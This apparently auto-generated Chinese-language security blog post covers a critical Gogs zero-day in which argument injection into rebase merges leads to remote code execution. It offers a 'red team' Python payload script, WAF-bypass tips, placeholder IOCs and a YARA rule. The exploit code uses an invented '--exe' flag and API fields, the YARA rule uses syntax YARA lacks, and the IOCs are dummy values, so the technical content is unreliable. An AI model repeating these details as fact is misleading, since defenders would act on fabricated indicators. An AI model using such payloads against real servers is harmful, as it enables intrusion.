---
layout: post
title:  "New Gogs zero-day flaw lets hackers get remote code execution"
date:   2026-05-28 15:35:12 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Gogs 零日漏洞：遠程代碼執行的風險
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Argument Injection, Git Rebase, Pull Request

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Gogs 的 `Merge()` 函數沒有正確地檢查用戶輸入的參數，導致攻擊者可以注入惡意的 `--exe` 旗標，從而實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 攻擊者創建一個新的用戶帳戶和倉庫。
  2. 攻擊者啟用 rebase 合併並提交一個惡意的 pull request。
  3. Gogs 執行 `git rebase` 命令，並注入惡意的 `--exe` 旗標。
  4. 攻擊者可以遠程執行任意代碼。
* **受影響元件**: Gogs 0.14.2 和 0.15.0+dev 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個新的用戶帳戶和倉庫。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 創建一個新的用戶帳戶和倉庫
    url = "https://example.com/api/v1/users"
    data = {"username": "attacker", "password": "password"}
    response = requests.post(url, json=data)
    
    # 啟用 rebase 合併並提交一個惡意的 pull request
    url = "https://example.com/api/v1/repos/attacker/repo/pulls"
    data = {"title": "Malicious Pull Request", "body": "This is a malicious pull request.", "head": "malicious-branch"}
    response = requests.post(url, json=data)
    
    # 注入惡意的 --exe 旗標
    url = "https://example.com/api/v1/repos/attacker/repo/pulls/1/merge"
    data = {"merge_method": "rebase", "flags": ["--exe"]}
    response = requests.post(url, json=data)
    
    ```
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 URL 編碼或 Base64 編碼來隱藏惡意的 `--exe` 旗標。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /var/www/html |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Gogs_RCE {
      meta:
        description = "Gogs RCE Detection Rule"
        author = "Your Name"
      strings:
        $rebase_merge = "rebase --exe"
      condition:
        $rebase_merge in (http.request.body or http.response.body)
    }
    
    ```
* **緩解措施**: 更新 Gogs 至最新版本，並啟用 rebase 合併的安全檢查。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Argument Injection**: 想像兩個函數之間的參數傳遞。技術上是指攻擊者可以注入惡意的參數，從而實現任意代碼執行。
* **Git Rebase**: Git 的 rebase 命令可以用來合併分支。技術上是指重新基於一個新的基礎分支，從而實現分支合併。
* **Pull Request**: Git 的 pull request 是用來請求合併分支的。技術上是指創建一個新的請求，從而實現分支合併。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-gogs-zero-day-flaw-lets-hackers-get-remote-code-execution/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


